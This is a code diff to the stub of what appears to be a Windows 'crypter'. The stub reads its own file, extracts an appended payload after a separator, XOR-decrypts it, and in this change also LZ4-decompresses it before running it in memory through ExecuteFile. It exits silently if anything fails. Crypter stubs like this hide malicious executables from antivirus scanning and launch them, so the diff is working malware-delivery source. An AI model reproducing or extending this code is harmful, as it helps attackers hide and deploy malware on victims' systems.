@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #ifdef _DEBUG
 //#error No support
 #endif
@@ -6,6 +7,10 @@
 #include <TlHelp32.h>
 
 #include "../common/common.h"
+
+#include "../common/lz4/lz4.h"
+
+#include <stdio.h>
 
 BOOL ExecuteFile(LPSTR szFilePath, LPVOID pFile, PHANDLE phThread)
 {
@@ -137,19 +142,36 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 	CloseHandle(hStubFile);
 
 	DWORD dwSeparatorPositionEnd = FindSig(puStubData, dwStubSize, szSeparator, strlen(szSeparator), 1) + strlen(szSeparator);
-	DWORD dwExecutableSIze = dwStubSize - dwSeparatorPositionEnd;
+	DWORD dwExecutableSize = dwStubSize - dwSeparatorPositionEnd;
 
-	PUCHAR puExecutableData = MALLOC(dwExecutableSIze * sizeof(char));
+	PUCHAR puExecutableData = MALLOC(dwExecutableSize * sizeof(char));
 	for (int i = dwSeparatorPositionEnd; i < dwStubSize; i++)
 		*(puExecutableData + (i - dwSeparatorPositionEnd)) = *(puStubData + i);
 
 	MFREE(puStubData);
 	
-	XORBinary(puExecutableData, dwExecutableSIze, szEncryptionKey, strlen(szEncryptionKey));
+	XORBinary(puExecutableData, dwExecutableSize, szEncryptionKey, strlen(szEncryptionKey));
+
+#if CRYPTER_USE_LZ4_COMPRESSION
+	int iMaxDecompressedSize = BinRead32(puExecutableData);
+
+	PCHAR pDecompressedData = MALLOC(iMaxDecompressedSize * sizeof(CHAR));
+	const char* pCompressedData = (const char*)puExecutableData + sizeof(int);
+
+	int iDecompressedSize = LZ4_decompress_safe(pCompressedData, (char*)pDecompressedData, (int)dwExecutableSize - sizeof(int), iMaxDecompressedSize);
+
+	if (iDecompressedSize != iMaxDecompressedSize)
+		ExitProcess(0);
+
+	MFREE(puExecutableData);
+
+	puExecutableData = (PUCHAR)pDecompressedData;
+#endif
 
 	HANDLE hThread = INVALID_HANDLE_VALUE;
 
-	ExecuteFile(szCurrentFilepath, puExecutableData, &hThread);
+	if (!ExecuteFile(szCurrentFilepath, puExecutableData, &hThread))
+		ExitProcess(0);
 
 	MFREE(szCurrentFilepath);
 	MFREE(puExecutableData);
